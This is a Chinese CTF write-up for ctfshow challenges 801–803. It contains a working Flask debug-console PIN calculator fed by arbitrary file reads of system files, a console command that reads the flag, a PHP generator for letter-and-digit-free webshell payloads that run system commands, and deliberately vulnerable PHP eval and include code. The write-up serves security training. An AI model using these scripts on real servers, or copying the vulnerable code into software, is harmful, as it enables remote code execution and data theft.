---
id: ctfshow-常用姿势
title: ctfshow-常用姿势
---



## 801-flask算pin

输入不存在的值使其报错，可以看到是flask开启了debug模式的界面，将鼠标移到任意一行上就可以看到右边有个terminal的标记，点击要我们输入pin码，这个pin码在跑flask的时候会给在终端里



本题考点就是利用任意文件读获取信息再利用脚本来跑出这个pin码

计算pin所需要的值为：

1. username：
   flask所登录的用户名，可以读`/etc/passwd` 或者 `getpass.getuser()`

2. modname：
   默认为flask.app

3. appname：
   默认为Flask
   `getattr(app, “name”, app.class.name)`

4. moddir：
   flask库下app.py的绝对路径，可通过报错得到 或者 `getattr(mod,"__file__",None)`

5. uuidnode：
   当前网络的mac地址的十进制数，读网卡:
   如`/sys/class/net/ens0/address` 或 `/sys/class/net/eth0/address`

6. machine_id：
   docker机器id
   linux的id一般存放于`/etc/machine-id` 或`/proc/sys/kernel/random/boot_id`
   docker的则读取`/proc/self/cgroup`取`/docker/`后的字符


   （但在本题要读`/proc/sys/kernel/random/boot_id`
   和`/proc/self/cgroup`然后将其拼接起来）



脚本附上：

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'root'# /etc/passwd
    'flask.app',# 默认值
    'Flask',# 默认值
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # 报错得到
]

private_bits = [
    '2485377585129',#  /sys/class/net/ens0/address or /sys/class/net/eth0/address
    '653dc458-4634-42b1-9a7a-b22a082e1fce18de34833d56b14e3178cdffe0c6fd87895b75d5affd11b0ff6d8a3340f26d6d'#  /proc/sys/kernel/random/boot_id + /proc/self/cgroup
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

然后得到一个可交互的：

```
import os
os.popen('cat /flag').read()
```

![](https://s2.loli.net/2022/03/22/cFGjSJgoa8NnOA4.png)





## 802-无子母数字RCE

```php
<?php

# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-03-19 12:10:55
# @Last Modified by:   h1xa
# @Last Modified time: 2022-03-19 13:27:18
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

error_reporting(0);
highlight_file(__FILE__);
$cmd = $_POST['cmd'];

if(!preg_match('/[a-z]|[0-9]/i',$cmd)){
    eval($cmd);
}
```

顾名思义就是把字母数字都给过滤掉了

可以利用像异或、自增、取反：`$、+、-、^、~、|`来构造payload

1. [一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
2. [无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
3. [无字母数字绕过正则总结（含上传临时文件、异或、或、取反、自增脚本-羽](https://blog.csdn.net/miuzzx/article/details/109143413)
4. [ctfshow web入门 web41_羽的博客-CSDN博客](https://blog.csdn.net/miuzzx/article/details/108569080)

具体原理不赘述了==，给上群主师傅的脚本吧

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-03-19 14:35:44
# @Last Modified by:   h1xa
# @Last Modified time: 2022-03-19 16:41:46
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


$precode=<<<code
\$_=('@'^'!');
\$__=\$_++;
\$___=++\$__;
\$____=++\$___;
\$_____=++\$____;
\$______=++\$_____;
\$_______=++\$______;
\$________=++\$_______;
\$_________=++\$________;
\$__________=++\$_________;
\$___________=++\$__________;
\$____________=++\$___________;
\$_____________=++\$____________;
\$______________=++\$_____________;
\$_______________=++\$______________;
\$________________=++\$_______________;
\$_________________=++\$________________;
\$__________________=++\$_________________;
\$___________________=++\$__________________;
\$____________________=++\$___________________;
\$_____________________=++\$____________________;
\$______________________=++\$_____________________;
\$_______________________=++\$______________________;
\$________________________=++\$_______________________;
\$_________________________=++\$________________________;
\$__________________________=++\$_________________________;
\$_=('@'^'!');
code;

eval($precode);


#使用异或生成任意无字母数字代码
function createCode($code){
	global $precode;
	$ret = "";
	for ($i=0; $i < strlen($code); $i++) { 

		$c = $code[$i];
		if(ord($c)<97 || ord($c)>122){
			$ret .= "$c";
		}else{
			$ret .= '$'.str_repeat('_', ord($c)-96);
		}

		
	}
	return urlencode("$precode(\"".substr($ret,0,stripos($ret, "("))."\")".substr($ret, stripos($ret,"(")));
}


echo createCode('system("tac flag.php");');
```

## 803-phar文件包含



```php
<?php

# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-03-19 12:10:55
# @Last Modified by:   h1xa
# @Last Modified time: 2022-03-19 13:27:18
# @email: h1xa@ctfer.com
# @link: https://ctfer.com


error_reporting(0);
highlight_file(__FILE__);
$file = $_POST['file'];
$content = $_POST['content'];

if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file.'.txt')){
        include $file.'.txt';
    }else{
        file_put_contents($file,$content);
    }
}
```

